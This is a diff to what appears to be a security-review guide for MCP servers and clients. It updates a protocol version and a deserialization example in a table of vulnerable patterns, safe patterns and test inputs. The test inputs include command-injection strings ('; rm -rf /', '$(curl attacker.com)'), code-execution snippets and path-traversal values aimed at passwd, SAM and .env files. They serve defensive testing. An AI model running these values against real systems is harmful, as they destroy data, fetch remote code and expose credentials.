@@ -15,7 +15,7 @@ description: |
 ## Process
 
 ### Step 1 — Classify the target
-- Check **MCP protocol version [2025-03-26](https://modelcontextprotocol.io/specification/2025-03-26) or later**. Flag older versions as a finding but continue the review.
+- Check **MCP protocol version [2025-03-26](https://modelcontextprotocol.io/specification/2025-03-26) or later** (current: [2025-11-25](https://modelcontextprotocol.io/specification/2025-11-25)). Flag older versions as a finding but continue the review.
 - Determine whether the target is a **server** or **client**.
 - Classify transport as **network-exposed** or **local-only** using the transport reference below.
 - Record transport, protocol version, and whether sessions exist.
@@ -215,7 +215,7 @@ Docs describing the repo's **own** server behavior, transport, auth posture, or 
 |---|---|---|---|---|
 | Command injection | `exec("convert " + args.filename)`, `os.system(f"process {user_input}")`, `Process.Start("cmd", "/c " + toolArg)` | `execFile("convert", [args.filename])`, `subprocess.run(["process", user_input], shell=False)` | `; rm -rf /`, `$(curl attacker.com)`, `| net user` must be rejected or treated literally | CWE-78 |
 | Dynamic code evaluation | `eval(args.expression)`, `exec(tool_output)`, `new Function(args.code)()` | Sandboxed parser, AST-based evaluation, or predefined allowlist | `__import__('os').system('whoami')`, `require('child_process').exec('id')` must be rejected | CWE-94, CWE-95 |
-| Unsafe deserialization | `pickle.loads(user_data)`, `yaml.load(input, Loader=yaml.FullLoader)`, `BinaryFormatter.Deserialize(stream)` | `yaml.safe_load()`, `JSON.parse()` plus schema validation; avoid binary formats for untrusted input | Crafted serialized payloads must be rejected or safely handled | CWE-502 |
+| Unsafe deserialization | `pickle.loads(user_data)`, `yaml.load(input, Loader=yaml.UnsafeLoader)`, `BinaryFormatter.Deserialize(stream)` | `yaml.safe_load()`, `JSON.parse()` plus schema validation; avoid binary formats for untrusted input | Crafted serialized payloads must be rejected or safely handled | CWE-502 |
 | Path traversal | `fs.readFile(args.path)` without validation, `open(user_path, 'w')` | Canonicalize and enforce an allowlisted base directory before read/write/execute | `../../../../etc/passwd`, `C:\Windows\System32\config\SAM`, `..\..\..\.env` must be rejected | CWE-22 |
 | SSTI | `Template(user_input).render()`, `Handlebars.compile(args.template)({data})` | Never use user input as template source; use predefined templates with parameters only | `{{7*7}}`, `${7*7}`, `<%= 7*7 %>` must not render `49` | CWE-1336 |
 | Dependency hijacking | Unpinned deps such as `"lodash": "^4.0.0"`; internal package names resolvable from public registries | Pin exact versions, keep lock files with integrity hashes, use trusted/scoped registries, verify signatures where available | `npm audit`, `pip audit`, or `dotnet list package --vulnerable`; review for CVEs and suspicious packages | CWE-829 |
